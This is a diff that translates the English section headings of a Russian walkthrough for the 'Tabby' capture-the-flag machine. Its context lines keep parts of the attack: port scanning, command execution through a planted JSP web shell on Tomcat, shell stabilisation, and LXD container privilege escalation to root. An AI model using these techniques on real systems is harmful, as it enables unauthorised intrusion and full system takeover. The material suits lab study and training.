@@ -57,7 +57,7 @@ Apache 2.4.41 (Mega Hosting) и Tomcat 9.0.31 на Ubuntu 20.04. Второй vh
 
 ## Разведка
 
-### Port Scan
+### Сканирование Портов
 
 ```bash
 nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n tabby.htb -oA scans/quick
@@ -74,7 +74,7 @@ nmap -sC -sV -Pn -n --open -p 22,80,8080 tabby.htb -oA scans/detail
 echo "10.129.77.170    tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
 ```
 
-### Vhost Enumeration
+### Перечисление Vhost
 
 В HTML главной страницы есть внешняя ссылка:
 
@@ -181,7 +181,7 @@ curl -s -G "http://tabby.htb:8080/cmd/cmd.jsp" \
 
 **Shell от `tomcat` (uid 997).**
 
-### Stabilize
+### Стабилизация
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -232,7 +232,7 @@ cat /home/ash/user.txt
 
 ## Повышение Привилегий (LXD)
 
-### Enumeration
+### Перечисление
 
 ```bash
 id
@@ -275,7 +275,7 @@ lxc start privesc
 
 **Важный нюанс:** snap-версия LXD не видит `/tmp` - поэтому образ нужно копировать в `/home/ash/`. Также `lxc init` падает без storage pool - требуется `lxc storage create default dir` и правка профиля.
 
-### Root flag
+### Root Флаг
 
 ```bash
 lxc exec privesc /bin/sh
